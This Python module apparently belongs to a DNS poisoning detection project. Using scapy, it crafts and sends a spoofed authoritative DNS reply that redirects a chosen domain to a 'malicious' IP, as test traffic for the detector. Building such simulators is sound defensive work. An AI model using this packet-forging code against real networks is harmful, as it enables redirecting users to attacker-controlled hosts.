#!/usr/bin/env python3
"""
DNS poisoning simulator for DNS Poisoning Detection System.
"""

import logging
from datetime import datetime

logger = logging.getLogger("DNS_Monitor")

# Try to import required dependencies with helpful error messages
try:
    from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
except ImportError:
    logger.error("Error: 'scapy' package not installed. Please install it using: pip install scapy")
    raise ImportError("Missing 'scapy' package")

class DNSPoisoningSimulator:
    """Simulates DNS poisoning attacks for testing."""
    
    def __init__(self, config):
        """Initialize DNS poisoning simulator."""
        self.config = config
    
    def craft_malicious_response(self, target_domain: str, malicious_ip: str) -> bytes:
        """
        Craft a malicious DNS response packet.
        
        Args:
            target_domain: Domain to poison
            malicious_ip: IP to redirect to
            
        Returns:
            Raw packet bytes
        """
        # Create a DNS response packet
        ip_layer = IP(dst="192.168.1.100", src="192.168.1.1")  # Example IPs; adjust as needed
        udp_layer = UDP(dport=33333, sport=53)
        
        # Create DNS response with the malicious IP
        dns_layer = DNS(
            id=12345,
            qr=1,  # Response
            aa=1,  # Authoritative
            rd=1,  # Recursion desired
            ra=1,  # Recursion available
            qd=DNSQR(qname=target_domain),
            an=DNSRR(
                rrname=target_domain,
                type='A',
                ttl=300,
                rdata=malicious_ip
            )
        )
        
        # Combine layers
        packet = ip_layer / udp_layer / dns_layer
        return bytes(packet)
    
    def simulate_attack(self, target_domain: str, malicious_ip: str) -> dict:
        """
        Simulate a DNS poisoning attack by crafting and sending a malicious response.
        
        Args:
            target_domain: The domain to poison.
            malicious_ip: The IP address to which the domain should resolve.
        
        Returns:
            A dictionary containing the simulation status.
        """
        try:
            packet_bytes = self.craft_malicious_response(target_domain, malicious_ip)
            # Send the packet using scapy's send function
            send(packet_bytes, verbose=False)
            logger.info(f"Simulated attack for domain {target_domain} redirecting to {malicious_ip}")
            return {"status": "attack simulated", "domain": target_domain, "malicious_ip": malicious_ip}
        except Exception as e:
            logger.error(f"Error simulating attack: {e}")
            return {"status": "error", "error": str(e)}
